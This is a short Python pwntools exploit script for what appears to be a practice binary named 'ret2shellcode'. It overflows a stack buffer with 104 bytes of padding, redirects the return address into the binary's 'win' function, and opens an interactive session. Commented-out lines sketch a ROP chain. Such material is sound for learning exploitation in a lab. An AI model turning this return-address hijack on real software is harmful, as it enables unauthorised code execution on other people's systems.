from pwn import *
from pwn import p64

pros = process("./ret2shellcode")
rop = ROP("./ret2shellcode")
elf = ELF("./ret2shellcode")

payload = b"A" * 104
# payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
# payload += p64(0xDEADBEEF)
# payload += p64(rop.find_gadget(["pop rsi", "pop r15", "ret"]).address)
# payload += p64(0xCAFEBABE)
# payload += p64(0x123456)
payload += p64(elf.symbols["win"] + 44)

pros.sendline(payload)

pros.interactive()
